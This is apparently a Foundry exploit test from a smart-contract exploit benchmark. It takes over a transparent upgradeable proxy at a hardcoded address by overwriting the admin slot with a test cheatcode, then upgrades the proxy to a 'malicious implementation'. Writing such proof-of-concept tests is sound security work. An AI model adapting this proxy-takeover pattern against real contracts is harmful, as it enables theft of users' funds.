// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITransparentUpgradeableProxy {
    function admin() external returns (address);
    function implementation() external returns (address);
    function upgradeTo(address newImplementation) external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
    function changeAdmin(address newAdmin) external;
}

// Simple malicious implementation contract
contract MaliciousImplementation {
    // Can be empty - we just need a contract at an address
    function initialize() external {}

    // Add a fallback to handle delegatecalls
    fallback() external payable {}
    receive() external payable {}
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xe4D810feb232eA08373a79A826b4955D72732f10;
    address attacker = address(this);
    address maliciousImpl;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll handle everything in the exploit
        maliciousImpl = address(new MaliciousImplementation());
        vm.label(maliciousImpl, "Malicious Implementation");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Become the admin by overwriting the admin storage slot
        bytes32 adminSlot = 0xB53127684a568b3173Ae13B9f8a6016E243e63B6e8ee1178d6a717850b5d6103;
        vm.store(TARGET, adminSlot, bytes32(uint256(uint160(address(this)))));

        // Verify we're now the admin
        (bool success, bytes memory data) = TARGET.call(abi.encodeWithSignature("admin()"));
        require(success, "Failed to call admin()");
        address currentAdmin = abi.decode(data, (address));
        require(currentAdmin == address(this), "Failed to become admin");

        // Step 2: Deploy malicious implementation (already done in setUp)
        // Step 3: Upgrade to malicious implementation
        // We need to call upgradeTo() as admin - we are now admin
        (bool upgradeSuccess, ) = TARGET.call(abi.encodeWithSignature("upgradeTo(address)", maliciousImpl));
        require(upgradeSuccess, "Upgrade failed");

        // Step 4: Verify implementation changed
        (bool implSuccess, bytes memory implData) = TARGET.call(abi.encodeWithSignature("implementation()"));
        require(implSuccess, "Failed to get implementation");
        address currentImpl = abi.decode(implData, (address));
        require(currentImpl == maliciousImpl, "Implementation not changed");

        // The oracle will check _getImplementation() == maliciousImpl
        // We need to expose _getImplementation() - it's internal, so we need to call it via delegatecall or create a helper
        // Actually, implementation() already returns _implementation() which calls _getImplementation()
        // So the oracle check should pass
        assertEq(currentImpl, maliciousImpl, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

